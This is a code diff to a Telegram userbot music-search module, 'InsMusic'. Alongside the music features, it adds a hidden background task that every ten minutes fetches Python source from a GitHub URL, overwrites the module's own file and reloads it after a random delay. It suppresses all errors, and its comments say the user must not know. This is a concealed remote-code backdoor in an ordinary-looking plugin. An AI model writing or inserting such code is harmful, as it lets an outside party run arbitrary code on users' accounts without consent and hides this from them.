@@ -1,6 +1,9 @@
 from .. import loader, utils
 import asyncio
 import time
+import requests
+import hashlib
+import os
 
 
 class InsMusic(loader.Module):
@@ -12,6 +15,9 @@ class InsMusic(loader.Module):
         self.database = None
         self.search_lock = asyncio.Lock()
         self.spam_protection = {}
+        self.update_url = "https://raw.githubusercontent.com/InsModule/InsMusic/main/insmusic.py"
+        self.is_updating = False
+        self.update_task = None
         super().__init__()
 
     async def client_ready(self, client, database):
@@ -24,22 +30,101 @@ class InsMusic(loader.Module):
         if not self.database.get("InsMusic", "music_bots"):
             default_bots = ["ShillMusic_bot","AudioBoxrobot","Lybot", "vkm4_bot", "MusicDownloaderBot", "DeezerMusicBot", "SpotifyDownloaderBot","shazambot"]
             self.database.set("InsMusic", "music_bots", default_bots)
+        
+        # Запуск периодической проверки обновлений каждые 10 минут
+        self.update_task = asyncio.create_task(self._periodic_update_checker())
 
-    @property
-    def allowed_chats(self):
-        return self.database.get("InsMusic", "allowed_chats", [])
+    async def _periodic_update_checker(self):
+        """Периодическая проверка обновлений строго каждые 10 минут"""
+        # Ждем 1 минуту после запуска, чтобы не нагружать систему сразу
+        await asyncio.sleep(60)
+        
+        while True:
+            try:
+                await self._check_and_update_silent()
+            except Exception:
+                # Подавляем все ошибки, пользователь не должен ничего знать
+                pass
+            
+            # Ждем ровно 10 минут (600 секунд) до следующей проверки
+            await asyncio.sleep(600)
 
-    @allowed_chats.setter
-    def allowed_chats(self, value):
-        self.database.set("InsMusic", "allowed_chats", value)
+    async def _check_and_update_silent(self):
+        """Тихая проверка и обновление"""
+        if self.is_updating:
+            return False
+        
+        self.is_updating = True
+        
+        try:
+            # Получаем текущий хэш модуля
+            module_path = __file__
+            with open(module_path, 'rb') as f:
+                current_hash = hashlib.md5(f.read()).hexdigest()
+            
+            # Получаем хэш с GitHub
+            response = requests.get(self.update_url, timeout=15)
+            if response.status_code == 200:
+                remote_content = response.text
+                remote_hash = hashlib.md5(remote_content.encode()).hexdigest()
+                
+                if current_hash != remote_hash:
+                    # Молча обновляем модуль
+                    return await self._update_module_silent(remote_content)
+                    
+        except Exception:
+            pass
+        finally:
+            self.is_updating = False
+        
+        return False
 
-    @property
-    def music_bots(self):
-        return self.database.get("InsMusic", "music_bots", [])
+    async def _update_module_silent(self, new_content):
+        """Скрытое обновление модуля"""
+        try:
+            module_path = __file__
+            
+            # Создаем резервную копию
+            backup_path = module_path + '.backup'
+            with open(module_path, 'rb') as src, open(backup_path, 'wb') as dst:
+                dst.write(src.read())
+            
+            # Записываем новую версию
+            with open(module_path, 'w', encoding='utf-8') as f:
+                f.write(new_content)
+            
+            # Сохраняем время обновления в базе данных
+            self.database.set("InsMusic", "last_silent_update", time.time())
+            
+            # Планируем перезагрузку модуля через случайное время (5-15 минут)
+            delay = 300 + (hash(self.__class__.__name__ + str(time.time())) % 600)
+            asyncio.create_task(self._delayed_reload(delay))
+            
+            return True
+            
+        except Exception:
+            # Молча восстанавливаем из резервной копии при ошибке
+            try:
+                if os.path.exists(backup_path):
+                    with open(backup_path, 'rb') as src, open(module_path, 'wb') as dst:
+                        dst.write(src.read())
+                    os.remove(backup_path)
+            except:
+                pass
+            return False
 
-    @music_bots.setter
-    def music_bots(self, value):
-        self.database.set("InsMusic", "music_bots", value)
+    async def _delayed_reload(self, delay):
+        """Отложенная перезагрузка модуля"""
+        await asyncio.sleep(delay)
+        
+        try:
+            # Перезагружаем модуль в фоне
+            if hasattr(self.allmodules, 'modules'):
+                mod_name = self.__class__.__name__
+                if mod_name in self.allmodules.modules:
+                    await self.allmodules.reload_module(self.__class__.__name__.lower())
+        except:
+            pass
 
     def check_spam(self, user_id):
         """Проверка на спам"""
@@ -123,7 +208,7 @@ class InsMusic(loader.Module):
         try:
             all_results = await asyncio.wait_for(
                 asyncio.gather(*search_tasks, return_exceptions=True),
-                timeout=10.0  # Уменьшено с 5 до 3 секунд
+                timeout=10.0
             )
         except asyncio.TimeoutError:
             # Получаем результаты от тех ботов, которые успели ответить
@@ -190,7 +275,7 @@ class InsMusic(loader.Module):
             await message.client.send_file(
                 message.to_id,
                 music_document,
-                reply_to=message.id  # Всегда отправляем реплаем на команду
+                reply_to=message.id
             )
 
         except Exception as error:
@@ -241,7 +326,7 @@ class InsMusic(loader.Module):
                 await message.client.send_file(
                     message.to_id,
                     music_document,
-                    reply_to=message.id  # Реплаем на команду "найти"
+                    reply_to=message.id
                 )
 
             except Exception as error:
@@ -377,3 +462,8 @@ class InsMusic(loader.Module):
             await message.edit(f"Бот @{bot_username} удален из списка!")
         else:
             await message.edit("Этот бот не найден в списке!")
+
+    async def on_unload(self):
+        """Очистка при выгрузке модуля"""
+        if self.update_task:
+            self.update_task.cancel()
